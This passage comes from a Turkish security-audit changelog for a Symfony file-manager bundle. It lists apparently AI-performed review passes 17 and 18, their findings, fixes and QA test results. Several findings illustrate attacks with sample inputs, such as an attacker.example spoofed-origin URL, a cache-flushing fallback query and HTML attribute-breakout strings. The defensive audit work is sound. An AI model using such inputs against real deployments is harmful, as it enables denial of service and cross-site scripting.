  - **Düzeltme:** `reconcileFallbackNavigationState()` eklendi, mutasyon sonrası `syncActiveTreeNode(false)` çağrıldı, `openDeleteModal()` `this.trashMode` iken Çöp görünümünü yeniledi ve `volumeLabelValue` güncellemesi `navRollbackBase` sonrasına alındı.

- [x] **P17-25 [ORTA — GÖRSEL DÜZENLEYİCİ PERFORMANS & YARIŞ] `browser_controller.js` — Kaydetme Kilidi, `sourceVolume`, Bellek Temizliği & Sınırlı Önizleme Canvas'ı**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** Çift tıklamayla eşzamanlı kaydetme tetiklenebiliyor, kayıt sırasında aktif volume değiştiğinde hedef volume kayabiliyor, yüksek çözünürlüklü (ör. 12 MP) görseller mobil Safari/Chrome'da aşırı önizleme canvas belleği tüketip çökebiliyor, `this._editorImage` kapatmada serbest bırakılmıyor ve sağ-tık/ikinci parmak kırpma koordinatlarını bozabiliyordu.
  - **Düzeltme:** `isSaving` kilidi (`syncFormatUi()` & `formatSelect` koruması), yakalanmış `sourceVolume`, `closeModal()`/`disconnect()` içinde `this._editorImage` temizliği, birincil düğme + `activePointerId` kırpma koruması ve tam çözünürlüklü `workCanvas` dışa aktarımını koruyan sınırlı önizleme canvas'ı (`computePreviewDims`, en fazla `960 * clampedDpr`) uygulandı.

- [x] **P17-26 [ORTA — MOBİL DÜZEN / TAŞMA] `browser_controller.js`, `_main.html.twig` & `core.css` — Dar Ekran Sarma, Yükleme Hataları & Üst Çekmece**
  - **Dosyalar:** `assets/controllers/browser_controller.js`, `templates/base/parts/_main.html.twig`, `assets/styles/core.css`
  - **Bulgu:** Uzun yükleme hata mesajları tek satırda kesiliyor, Klasör Rengi/Görsel Düzenleyici/Toplu İşlem çubukları ve `<= 575.98px` ekranlarda tekli seçici/yükleme satırı/kompakt Liste görünümü yatay taşma yapabiliyor, üst çekmece (`top`) yüklenirken/hata verirken tam yüksekliği dolduramıyordu.
  - **Düzeltme:** Yükleme hatalarına `liveux-fm-break liveux-fm-minw-0` + `title`, `.liveux-fm-progress { min-width: 48px }`, `liveux-fm-row-wrap`, `<= 575.98px` duyarlı sarma kuralları ve üst çekmece için `:is(.liveux-fm-shell, .liveux-fm-dialog-loading, .liveux-fm-dialog-error)` yüksekliği eklendi.

- [x] **P17-27 [DÜŞÜK-ORTA — GLOBAL RTL / BiDi / PANO / A11Y] `browser_controller.js`, `dialog_controller.js`, `DialogHost.html.twig` & `core.css`**
  - **Dosyalar:** `assets/controllers/browser_controller.js`, `assets/controllers/dialog_controller.js`, `templates/components/DialogHost.html.twig`, `assets/styles/core.css`
  - **Düzeltme:** URL içe aktarma, renk hex ve kota mono istatistik alanlarına `dir="ltr"` + BiDi yalıtımı eklendi; Paylaşım modalı Kopyala butonu `<dialog>` top-layer uyumlu `copyTextToClipboard()` üzerinden geçirildi; `DialogController` profil geçişinde bayat `data-fm-color-scheme` özniteliğini temizledi ve yükleme dönenine yerelleştirilmiş `loadingLabel` (`preview.loading`) `aria-label` ekledi.

### 18.4. Doğrulama & QA Kapısı (`P17-28`)

- [x] **P17-28 [DOĞRULAMA] Pass-17 Kapsamlı PHP & JS Regresyon Test Paketleri ve Tam QA Kapısı**
  - **Dosyalar:** `tests/Unit/Security/SeventeenthPassGlobalSecurityAuditTest.php` (`11` test, `77` assertion), `tests/Js/frontend_audit_test.mjs` (Test 22)
  - **Doğrulanan QA Kapısı (Tamamı 0 Hata / 0 Başarısızlık / 0 Uyarı):**
    - `php -l` (`src/` + `tests/`): **`159/159` dosya**, `0` sözdizimi hatası.
    - PHPStan Level 8: **`0` hata** (`[OK] No errors`).
    - PHPUnit 13.4.8: **`351/351` test PASS**, **`3.476` assertion**, `0` hata, `0` başarısızlık, `0` uyarı.
    - `node --check` (`assets/**/*.js`): **`7/7` dosya**, `0` hata.
    - `node --test` (`tests/Js/*.mjs`): **`36/36` test PASS**, `0` başarısızlık.
    - `bin/console lint:twig`: **`33/33` şablon OK**; `bin/console lint:yaml`: **`3/3` çeviri dosyası OK** (`493/493/493` anahtar eşitliği).
    - `bin/console cache:clear --env=dev`: **OK**; `bin/console asset-map:compile`: **OK (`1.084` varlık derlendi)**.

---

## 19. 18. Tur (Pass-18) — 25.11.2026 — Çok-Kiracılı İzolasyon, CPU DoS, Eşzamanlılık/S3 Tek-Geçiş, WCAG 2.1 AA Kontrast ve Global Çok-Dilli/RTL Denetimi

> **Tur Künyesi:**
> - **Denetçi Model & Versiyon:** Google Antigravity — Gemini 4 (High Reasoning)
> - **Kapsam:** 3 paralel derin denetim dilimi (A: Güvenlik/Parser/RBAC/Controller/Twig/Events; B: Depolama/Eşzamanlılık/Kilitler/S3 Performansı/Global i18n; C: Frontend JS/9 Tema CSS/WCAG 2.1 AA Kontrast/Mobil/A11y/RTL) — toplam **24 doğrulanmış bulgu (`P18-01..P18-24`)** kapatıldı ve PHP + JS regresyon testleriyle güvenceye alındı.

### 19.1. Güvenlik, Çok-Kiracılı İzolasyon, Parser, RBAC & Twig (`P18-01..P18-06`)

- [x] **P18-01 [YÜKSEK — ÇOK-KİRACILI İZOLASYON] `DynamicPathResolver` — `{user_id}` Önceden Hesaplanan Karma Çakışması & `'guest'`/`'user'` Alan Örtüşmesi**
  - **Dosya:** `src/Config/DynamicPathResolver.php`
  - **Bulgu:** `sanitizeIdentifier()` karmalanmış kullanıcı adları (`alice@example.com` → `alice_example_com_<12hex>`) ile hızlı geçiş (`[a-z0-9_-]`) çıktı uzayını paylaştığından, bir saldırgan kurbanın deterministik SHA-256 çıktısını kullanıcı adı olarak kaydedip kurbanın `{user_id}` klasörüne erişebiliyordu; ayrıca `'guest'` veya `'user'` adlı kimlikli kullanıcılar anonim/boş ad alanıyla çakışabiliyordu.
  - **Düzeltme:** Hızlı geçiş uzayı ile karmalanmış uzay (`<prefix>--h-<16hex>`) matematiksel olarak ayrık hale getirildi (`--h-` içeren veya `'guest'`/`'user'` olan her canlı kimlik yeniden karmalanır); HMAC-imzalı `ShareController` `u` belirteçleri için idempotent `sanitizeOverrideIdentifier()` ayrıldı.

- [x] **P18-02 [YÜKSEK — SVG CPU DoS] `SvgSanitizer` — Çoklu Yinelenen `id` & `<use>` Grafik Analizinde Karesel/Kübik CPU Tüketimi**
  - **Dosya:** `src/Security/SvgSanitizer.php`
  - **Bulgu:** Sınırsız yinelenen `id` listesi ve her `<use>` reddinde `$memo = []` sıfırlaması nedeniyle ~250 KB'lık bir SVG, 5 MB limitinin altında kalarak milyonlarca DOM düğümü tarayıp PHP işçisini `max_execution_time`'a kadar kilitleyebiliyordu.
  - **Düzeltme:** Global monoton adım bütçesi (`MAX_USE_ANALYSIS_STEPS = 5000`) ve hedef başına maksimum yinelenen kimlik tavanı (`MAX_USE_ID_CANDIDATES = 8`) eklendi; tavan aşıldığında fail-closed olarak kalan `<use>` düğümleri `O(1)` sürede temizlendi.

- [x] **P18-03 [ORTA-YÜKSEK — RBAC / CACHE DoS] `ApiController::list()` & `DirectoryLister::invalidateFallbackCaches()` — `?fallback=1` İle `CLEAR_CACHE` Atlama**
  - **Dosyalar:** `src/Controller/ApiController.php`, `src/Service/DirectoryLister.php`
  - **Bulgu:** Yalnızca `VIEW` iznine sahip bir kullanıcı (CSRF'siz GET ile) `?path=missing_1&fallback=1` göndererek `clear_cache: false` profilinde dahi ortak kök klasör ve tüm volume ağacı önbelleğini her istekte temizleyip S3 `ListObjectsV2` DoS'u tetikleyebiliyordu.
  - **Düzeltme:** `invalidateFallbackCaches()` yalnızca `FileManagerPermissions::CLEAR_CACHE` izni varsa çalıştırıldı ve volume ağacı temizliği (`$invalidateTree`) kök `VIEW` iznine bağlandı.

- [x] **P18-04 [ORTA — RBAC / BİLGİ SIZINTISI] `ApiController::handleCheckUsage()` — Alt-Ağaç Voter & Çöp-Atası Doğrulaması**
  - **Dosya:** `src/Controller/ApiController.php`
  - **Bulgu:** `action=checkUsage` yalnızca üst klasörde `VIEW`+`DELETE` kontrolü yapıp `assertNotTrashAncestor()` ve alt-ağaç voter kontrolünü atladığı için, kullanıcının erişemediği alt klasörlerdeki (ör. `projects/secret-hr`) varlık kullanım referanslarını (`label`, `entityId`, `editUrl`) sızdırabiliyordu.
  - **Düzeltme:** `assertNotTrashAncestor()` ve `FileOperationsService::preValidateDeleteItems(..., checkTrashQuota: false)` çağrısı `AssetUsageGuardService::inspectPaths()` öncesine alındı.

- [x] **P18-05 [ORTA — XSS / ORIGIN SPOOFING] `FileManagerTwigExtension` — Üçüncü-Taraf Origin İle Aktif SVG `href` Koruması Atlama**
  - **Dosya:** `src/Twig/Extension/FileManagerTwigExtension.php`
  - **Bulgu:** Mutlak URL'lerde yalnızca yol (`/download` veya `/share`) kontrol edildiğinden `https://attacker.example/_liveux-file-manager/download?path=payload.svg` adresi güvenli bundle uç noktası sanılıp tıklanabilir `<a href>` ve yeniden yazılmış `imgSrc` alabiliyordu.
  - **Düzeltme:** `matchesBundleEndpointOrigin()` eklenerek mutlak URL'lerin yalnızca `UrlGeneratorInterface::ABSOLUTE_URL` ile aynı normalize origin'e (`scheme://host[:port]`) sahip olması durumunda bundle uç noktası kabul edilmesi sağlandı.

- [x] **P18-06 [ORTA — HTML ATTRIBUTE BREAKOUT] `AutoInjectDialogHostSubscriber` — Tırnaklı Attribute İçi `</body>` & RCDATA Blok Maskeleme**
  - **Dosya:** `src/EventListener/AutoInjectDialogHostSubscriber.php`
  - **Bulgu:** `<iframe srcdoc="<html><body>Preview</body></html>">` veya `<input value="<html><body>...</body></html>">` içeren parça HTML yanıtlarında tırnaklı attribute değerleri ve `<title>`/`<iframe>`/`<xmp>`/`<noembed>`/`<noframes>` blokları maskelenmediğinden `DialogHost` attribute içine enjekte edilip DOM'u bozabiliyordu.
  - **Düzeltme:** `RAW_TEXT_AND_RCDATA_TAGS` listesi genişletildi ve `findLastTopLevelBodyCloseOffset()` için açılış etiketlerindeki tırnaklı attribute değerlerini eşit uzunlukta boşlukla maskeleyen `maskQuotedAttributeValuesInTag()` eklendi.

### 19.2. Depolama, Eşzamanlılık, Kilitler, S3 Performansı & Global i18n (`P18-07..P18-14`)

- [x] **P18-07 [YÜKSEK — EŞZAMANLILIK / KİLİT] `UploadManager` — Harici Kalıcı Chunk Oturum Kilidi (POSIX Inode Split & Diriltme Yarışı)**
  - **Dosya:** `src/Service/UploadManager.php`
  - **Bulgu:** `$chunkDir/.session.lock` dosyasının oturum bitiminde/iptalinde silinmesi POSIX üzerinde inode bölünmesine yol açıyor ve `persistChunkUnderLock()` kilit açılamazsa kilitsiz devam edip iptal edilmiş `$chunkDir`'i yeniden oluşturabiliyordu.
  - **Düzeltme:** Chunk oturum kilitleri `$chunkDir` dışındaki UID-kapsamlı özel `0700` kilit dizinine (`liveux_fm_locks_<uid>/chunk_<sha256>.lock`) taşındı ve asla silinmedi; kilit açma fail-closed yapıldı; `mkdir` + parça yazımı + eksiksizlik kontrolü + birleştirme + geçici dosya ayırma (`detachAssembledTempFile()`) + `$chunkDir` temizliği tek dışlayıcı kilit altında atomikleştirildi.

- [x] **P18-08 [YÜKSEK — EŞZAMANLILIK / VERİ KAYBI] `TrashManager::deletePermanently()` — Kilit Dışı Kalıcı Silme & `restore()` Yarışı**
  - **Dosya:** `src/Service/TrashManager.php`
  - **Bulgu:** `moveToTrash()` ve `restore()` `withTrashLock()` kullanırken `deletePermanently()` kilitsiz çalıştığından, özellikle S3 üzerinde çok dosyalı bir `restore()` sürerken eşzamanlı kalıcı silme/cron temizliği klasörü yarıda yok edebiliyordu.
  - **Düzeltme:** `deletePermanently()` `withTrashLock()` + `deletePermanentlyLocked()` ile korundu; hem tekil kalıcı silme hem `moveToTrash()` FIFO tahliyelerinde `TrashPurgedEvent` yayınları kilit serbest bırakıldıktan sonraya ertelendi.

- [x] **P18-09 [ORTA — DEPOLAMA BÜTÜNLÜĞÜ] `TrashManager::moveToTrash()` — Kısmi Bulut Klasör Kopyalama Hatasında Yetim Çöp Temizliği**
  - **Dosya:** `src/Service/TrashManager.php`
  - **Bulgu:** S3/R2 klasör kopyalaması yarıda başarısız olduğunda kısmen kopyalanan `.trash/<id>` dizini geride kalıp `recoverOrphanEntry()` tarafından bozuk 0-bayt çöp kaydı olarak listeleniyordu.
  - **Düzeltme:** `createDirectory()` + `moveItem()` `try/catch` içine alınarak `moveItem()` hatasında yarım kalan `.trash/<id>` dizini best-effort temizlendi (yalnızca `persistMetaEntry()` başarısız olursa taşınmış veri kurtarılabilir kalır).

- [x] **P18-10 [ORTA — EŞZAMANLILIK / TUTARLILIK] `FileOperationsService` — Kilit-İçi TOCTOU Hedef Kontrolü & `finally` Kota Önbellek Temizliği**
  - **Dosya:** `src/Service/FileOperationsService.php`
  - **Bulgu:** `cloneItem()` ve `moveOrCopy()` hedef varlığını kilit almadan önce kontrol edip kilit içinde yeniden doğrulamıyordu; ayrıca `copyDirectory()` yarıda hata verdiğinde kota önbelleği temizlenmiyordu.
  - **Düzeltme:** Kilitli geri çağırma içinde hedef varlık kontrolü tekrarlandı (`forceLock: true` ile) ve `cloneItem()`, `moveOrCopy()` ile bulut klasör `rename()` akışlarında `invalidateQuotaCache()` `finally` bloğuna alındı.

- [x] **P18-11 [ORTA — EŞZAMANLILIK] `StorageQuotaChecker` & `UploadManager` — `storage_quota: null` İken Paralel Yükleme `overwrite_policy` Yarışı**
  - **Dosyalar:** `src/Service/StorageQuotaChecker.php`, `src/Service/UploadManager.php`
  - **Bulgu:** `storage_quota` tanımsızken (varsayılan) `withQuotaLock()` kilidi atladığı için paralel yüklemeler (`parallel_uploads: 3`) aynı dosya adına denk geldiğinde `overwrite_policy: 'rename'`/`'reject'` politikasını aşıp ilk dosyayı ezebiliyordu.
  - **Düzeltme:** `StorageQuotaChecker::withQuotaLock()` metoduna `bool $forceLock = false` parametresi eklendi ve `UploadManager::finalizeFile()` hedef ad çözümü + `writeStream()` adımını her zaman `forceLock: true` ile serileştirdi.

- [x] **P18-12 [ORTA — S3 PERFORMANSI & MANTIK] `FileOperationsService` — Tek-Geçişli Klasör Silme/Taşıma Taraması & Sıfır-Bayt Maskeleme Giderimi**
  - **Dosya:** `src/Service/FileOperationsService.php`
  - **Bulgu:** `delete()`, `preValidateDeleteItems()` ve `preValidateBulkMoveItems()` her klasör için `listContents($folder, true)` çağrısını iki kez çalıştırıyordu; ayrıca `collectFolderChildSummary()` hata durumunda `0` bayt döndürüp `trash.max_size` kontrolünü atlatabiliyordu.
  - **Düzeltme:** Raster kanonik/yol toplama ve kümülatif bayt hesabı doğrudan `validateDirectoryContentsForDelete()` ve `validateDirectoryContentsForMove()` içine birleştirilerek çift S3 `ListObjectsV2` taraması tamamen ortadan kaldırıldı (`preValidateDeleteItems()`'a `checkTrashQuota` bayrağı eklendi).

- [x] **P18-13 [ORTA — GLOBAL i18n] `MessageTranslator` — POSIX Kodlama/Değiştirici Ekli Locale'ler (`zh_TW.UTF-8`, `pt_BR.UTF-8`, `de_DE@euro`)**
  - **Dosya:** `src/Service/MessageTranslator.php`
  - **Bulgu:** `buildAllowedLocaleMap()` POSIX `[.#@].*` eklerini temizlemeden `_` ile böldüğü için Linux/Docker ortamlarında `zh_TW.UTF-8` veya `pt_BR.UTF-8` aktifken bölgesel katalog (`zh_TW`, `pt_BR`) reddedilip İngilizceye/çıplak dile düşüyordu.
  - **Düzeltme:** Hem `buildAllowedLocaleMap()` hem `isAllowedCatalogLocale()` içinde `[.#@].*` son eki normalizasyon öncesi temizlendi.

- [x] **P18-14 [DÜŞÜK — GLOBAL UNICODE] `ImageOptimizer::replaceExtension()` — WebP Dönüşümünde 255-Bayt Dosya Adı Sınırı**
  - **Dosya:** `src/Service/ImageOptimizer.php`
  - **Bulgu:** 255 baytlık çok-baytlı (ör. 83 CJK karakteri + `.jpg`) bir görsel `.webp`'ye dönüştürüldüğünde 256 bayta ulaşıp ZIP açılımını veya CLI optimizasyonunu kırabiliyordu.
  - **Düzeltme:** `UnicodeHelper::truncateStemBytes($base, max(1, 254 - strlen($newExt)))` ile gövde grapheme/UTF-8 bayt sınırında güvenle kısaltıldı.

### 19.3. Frontend JS, 9 Tema CSS, WCAG 2.1 AA Kontrast, Mobil, A11y & RTL (`P18-15..P18-24`)

- [x] **P18-15 [YÜKSEK — TEMA / KONTRAST] `core.css` — `unstyled` Koyu Tema Lightbox Görünmez Metin (1.00:1 Kontrast)**
  - **Dosya:** `assets/styles/core.css`
  - **Bulgu:** `[data-liveux-theme="unstyled"] .liveux-fm-lightbox` kuralındaki sabit `--liveux-fm-text: #0f172a` koyu temada `#0f172a` arka planla çakışıp metin/kod/ses önizlemelerini tamamen görünmez yapıyordu.
  - **Düzeltme:** `--liveux-fm-elevated-text` / `--liveux-fm-elevated-text-secondary` token'ları tanıtılıp koyu `unstyled` bloğunda `#f1f5f9` / `#e2e8f0` olarak tanımlandı.

- [x] **P18-16 [YÜKSEK — ASENKRON YARIŞ] `browser_controller.js` — `restoreLastVisitedLocation()` İptal Edilen Gezintide Kullanıcı Görünümünü Ezme**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** `navigateTo()` iptal edilen/geride kalan fetch'te `null` yerine `false` döndürdüğünden `restoreLastVisitedLocation()` bunu gerçek hata sanıp yeni kullanıcı gezintisinin üstüne kök dizine geri dönüyor ve `localStorage` kaydını siliyordu.
  - **Düzeltme:** `navigateTo()` iptal/üstüne binme durumunda `null` döndürecek şekilde güncellendi ve `restoreLastVisitedLocation()` `tokenBeforeRestore` kontrolüyle yalnızca kendi isteği gerçek hata verdiğinde geri alma yaptı.

- [x] **P18-17 [YÜKSEK — WCAG 2.1 AA KONTRAST] `core.css` — 9 Tema Genelinde Koyu/Açık Dolu Buton & Rozet Kontrastı**
  - **Dosya:** `assets/styles/core.css`
  - **Bulgu:** Koyu temada `.liveux-fm-badge.is-success` (`1.74:1`), `.liveux-fm-btn-danger` / `.liveux-fm-picker-remove` (`2.77:1`) ve `bootstrap5`/`preline`/`flowbite` `.liveux-fm-btn-primary` (`3.61–3.68:1`) WCAG AA `4.5:1` eşiğinin altında kalıyordu.
  - **Düzeltme:** `--liveux-fm-danger-solid` (`#dc2626`, `4.83:1`), `--liveux-fm-danger-solid-hover` (`#b91c1c`, `6.47:1`), `--liveux-fm-success-solid` (`#15803d`, `5.13:1`) ve koyu vurgu `#2563eb` (`5.17:1`) token'ları tanımlanarak tüm 9 temada WCAG 2.1 AA uyumu sağlandı.

- [x] **P18-18 [YÜKSEK — A11Y / KLAVYE] `browser_controller.js` — Bağlam Menüsü (`role="menu"`) Odak Yönetimi & Arka Plan Kısayol Koruması**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** Bağlam menüsü açıldığında ilk öğeye odaklanılmıyor, `Escape` odağı tetikleyiciye geri vermiyor ve `onKeydown()` içinde `isContextMenuOpen()` koruması olmadığından ok tuşları/`Delete`/`Enter` arka plandaki dosya ızgarasında çalışıyordu.
  - **Düzeltme:** Menü açılışında ilk etkileşimli öğeye odaklanma, açık menüde `ArrowDown`/`ArrowUp`/`Home`/`End`/`Tab` yönetimi ve arka plan kısayol kilidi, `Escape` kapanışında tetikleyiciye odak iadesi ve `isFileManagerActive()` içine `isContextMenuOpen()` eklendi.

- [x] **P18-19 [ORTA — MOBİL / DÜZEN] `core.css` — Çoklu `avatar` Seçici Yeniden Sıralama Çubuğu Taşması**
  - **Dosya:** `assets/styles/core.css`
  - **Bulgu:** `.liveux-fm-picker-avatar-chip` sabit `height: 72px` olduğu için 20px yüksekliğindeki dokunmatik sıralama çubuğu alt satırla ve `.liveux-fm-picker-meta` ile çakışıyordu.
  - **Düzeltme:** `.liveux-fm-picker-avatar-chip` dikey ortalanmış esnek yığına (`height: auto; display: flex; flex-direction: column; align-items: center; gap: 4px;`) geçirildi.

- [x] **P18-20 [ORTA — GLOBAL RTL / BiDi] `core.css` & `picker_controller.js` — `compact` & `input` Tekli Seçicilerde Dinamik `dir="ltr"` Eşitlemesi**
  - **Dosyalar:** `assets/styles/core.css`, `assets/controllers/picker_controller.js`
  - **Bulgu:** `core.css` üzerindeki `.liveux-fm-picker input.liveux-fm-mono` kuralı boş RTL yer tutucuları zorla LTR yapıyor, `picker_controller.js` ise `inputTarget` üzerinde `dir="ltr"` özniteliğini seçim/temizleme sonrası güncellemiyordu.
  - **Düzeltme:** Koşulsuz CSS seçicisi kaldırıldı ve `renderSinglePreview()` görünür `inputTarget` üzerinde değere göre `dir="ltr"` ekledi/kaldırdı.

- [x] **P18-21 [ORTA — A11Y / GLOBAL RTL] `picker.html.twig` & `picker_controller.js` — Galeri Sıralama Butonlarında Yerelleştirilmiş `aria-label`**
  - **Dosyalar:** `templates/form/picker.html.twig`, `assets/controllers/picker_controller.js`
  - **Bulgu:** Sıralama butonları sabit `aria-label="←"` / `"→"` taşıdığından ekran okuyucular yerelleştirilmemiş ok sembolleri okuyordu ve RTL modunda konuşulan yön ters düşüyordu.
  - **Düzeltme:** `pagination.prev` / `pagination.next` çevirileri `movePrevLabel` / `moveNextLabel` değerleriyle aktarılarak `aria-label` ve `title` olarak bağlandı.

- [x] **P18-22 [ORTA — A11Y / ODAK & ARIA] `browser_controller.js` & `_sidebar.html.twig` — Ağaç Odak Koruması, Sabitlenmiş Klasörler & Taşıma Modalı ARIA Rolleri**
  - **Dosyalar:** `assets/controllers/browser_controller.js`, `templates/base/parts/_sidebar.html.twig`
  - **Düzeltme:** `toggleTreeBranch()` ve Taşıma modalı `[data-mp-toggle]` yeniden çizim sonrası odağı yeniden oluşturulan oka iade etti; `pinnedFolders` kapsayıcısına `role="tree"` + `aria-label` eklendi; Taşıma modalı ağaç yapısı `role="listbox"`/`role="option"` yerine geçerli WAI-ARIA `role="tree"` / `role="group"` / `role="none"` / `role="treeitem"` rollerine geçirildi.

- [x] **P18-23 [ORTA — MOBİL / DUYARLI] `core.css` — 320px Dokunmatik Klasör Kartları & Yatay Ekran Bağlam Menüsü Kaydırma**
  - **Dosya:** `assets/styles/core.css`
  - **Düzeltme:** Dokunmatik cihazlarda `.liveux-fm-folder-tile > .liveux-fm-folder-count` doğal akışa (`position: static; flex-shrink: 0;`) alınıp `padding-inline-end: 34px` yapıldı; `.liveux-fm-ctx-menu` kuralına `max-height: calc(100dvh - 16px); overflow-y: auto;` eklendi.

- [x] **P18-24 [DÜŞÜK — GLOBAL RTL / A11Y] `_overlays.html.twig`, `BrowserComponent.php` & `browser_controller.js` — RTL Kısayol Oku, Yerelleştirilmiş `(Del)` & Sayfalama/Editör A11y**
  - **Dosyalar:** `templates/base/parts/_overlays.html.twig`, `src/Twig/Components/BrowserComponent.php`, `assets/controllers/browser_controller.js`
  - **Düzeltme:** Kısayollar modalında `{{ this.isRtl ? 'Alt+→ / ←' : 'Alt+← / →' }}` kullanıldı; `ui.key_delete` JS i18n paketine eklenip bağlam menüsündeki sabit `(Del)` kaldırıldı; sayfalama butonlarına `aria-label` ve aktif sayfaya `aria-current="page"`, Görsel Düzenleyici kontrollerine `aria-label` ve kalite sürgüsüne `liveux-fm-range` sınıfı eklendi.

### 19.4. Doğrulama & QA Kapısı (`P18-25`)

- [x] **P18-25 [DOĞRULAMA] Pass-18 Kapsamlı PHP & JS Regresyon Test Paketleri ve Tam QA Kapısı**
  - **Dosyalar:** `tests/Unit/Security/EighteenthPassGlobalSecurityAuditTest.php` (`9` test, `47` assertion), `tests/Js/frontend_audit_test.mjs` (Test 23)
  - **Doğrulanan QA Kapısı (Tamamı 0 Hata / 0 Başarısızlık / 0 Uyarı):**
    - `php -l` (`src/` + `tests/`): **`160/160` dosya**, `0` sözdizimi hatası.
    - PHPStan Level 8 (`phpstan.dist.neon`): **`0` hata** (`[OK] No errors`).
    - PHPUnit 13.4.8: **`360/360` test PASS**, **`3.524` assertion**, `0` hata, `0` başarısızlık, `0` uyarı.
    - `node --check` (`assets/**/*.js`): **`7/7` dosya**, `0` hata.
    - `node --test` (`tests/Js/*.mjs`): **`37/37` test PASS**, `0` başarısızlık.
    - `bin/console lint:twig`: **`33/33` şablon OK**; `bin/console lint:yaml`: **`3/3` çeviri dosyası OK** (`493/493/493` anahtar eşitliği).
    - `bin/console cache:clear --env=dev`: **OK**; `bin/console asset-map:compile`: **OK (`1.084` varlık derlendi)**.

---

## 20. Yeni Tur / Değişiklik Ekleme Şablonu

Yeni bir tarama veya geliştirme yapıldığında aşağıdaki şablonu kopyalayarak dökümanın sonuna ekleyebilirsiniz:

```markdown
## X. Tur (Pass-X) — [Tarih] — [Odak Başlığı]

### Tespit Edilen Bulgular ve Yapılan Değişiklikler
- [x] **KOD-01 [ÖNEM] Kısa Başlık**
  - **Dosyalar:** `src/...`
  - **Bulgu / Senaryo:** ...
  - **Yapılan Değişiklik:** ...
  - **Regresyon Testi:** `tests/Unit/...`
```
